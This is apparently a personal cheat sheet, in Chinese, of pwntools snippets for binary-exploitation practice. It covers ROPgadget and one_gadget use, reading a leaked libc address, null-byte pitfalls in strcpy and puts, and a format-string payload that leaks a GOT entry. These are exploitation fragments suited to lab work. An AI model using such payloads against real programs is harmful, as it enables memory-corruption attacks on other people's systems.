
ROPgadget:
ROPgadget --binary ROP_LEVEL0 --only 'pop|ret'

addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) #接收泄露地址的常规操作

p.send()
p.sendline()  # 差别sendline相当于在data后加\n


one_gadget libc-2.23.so

gdb.attach(p)  # p=process
#或者ctx.debug()
pause()

+--------------------------------------------一些容易忽略的产生漏洞的点
函数特性strcpy，strcat，puts 等函数都是以'\x00'结尾的，就会导致溢出或者泄露的问题。
strcpy函数会把结尾的\x00也拷贝过去



+------------------------------------------------对于格式化字符串漏洞泄露任意地址
import binascii
p.sendline( p32(puts_got) + '%' + str(offset) + '$s')  #利用%s根据地址去输出字符串  ，当然要找到自己输入的地址所在的偏移
puts_addr = p.recv(8)[4:] 
puts_addr = '0x' + binascii.hexlify(puts_addr[::-1])
puts_addr=int(puts_addr,16)
